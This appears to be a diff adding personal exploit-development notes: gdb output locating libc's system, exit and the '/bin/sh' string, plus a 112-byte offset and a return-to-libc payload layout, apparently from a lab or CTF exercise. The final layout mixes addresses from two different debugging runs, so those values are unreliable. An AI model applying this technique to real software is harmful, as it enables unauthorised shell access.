@@ -1,0 +1,28 @@
+pattern offset: 112
+
+(gdb) p system
+p system
+$1 = {<text variable, no debug info>} 0xb761e310 <__libc_system>
+
+
+find 0xb761e310, +9999999, "/bin/sh"
+0xb7740bac
+
+
+
+
+(gdb) p system
+p system
+$1 = {<text variable, no debug info>} 0xb75a3310 <__libc_system>
+
+find 0xb75a3310, +9999999, "/bin/sh"
+0xb76c5bac
+
+p exit
+$2 = {<text variable, no debug info>} 0xb7596260 <__GI_exit>
+
+A * 112		offset
+0x b7 61 e3 10	system
+0x b7 59 62 60	exit
+0x b7 6c 5b ac	/bin/sh
+
